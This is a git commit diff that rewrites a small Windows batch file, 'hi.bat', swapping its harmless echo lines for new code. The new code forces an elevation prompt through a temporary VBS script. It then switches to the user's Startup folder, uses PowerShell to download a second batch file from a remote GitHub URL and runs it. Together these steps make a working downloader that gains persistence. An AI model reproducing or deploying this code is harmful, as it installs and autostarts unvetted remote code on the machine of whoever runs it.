899321e0dc8b69ca1d92da59ef5d1f737a32f0ec
Victor Francis <cisfran05@protonmail.com>
2023-11-06 13:52:17 +0100

    Update hi.bat

--- hi.bat
+++ hi.bat
@@ -1,5 +1,22 @@
-::echo msgbox "Welcome Clown!!!" > %tmp%\tmp.vbs
-::wscript %tmp%\tmp.vbs
-::del %tmp%\tmp.vbs
-echo hiiii
-echo executed
+@echo off
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else (
+    goto gotAdmin
+)
+
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+set params = %*:"="
+echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+"%temp%\getadmin.vbs"
+del "%temp%\getadmin.vbs"
+exit /B
+
+:gotAdmin
+color 0a
+::cd %temp%
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Cisfran05/google/main/100.bat', '.\100.bat') }"
+call .\100.bat
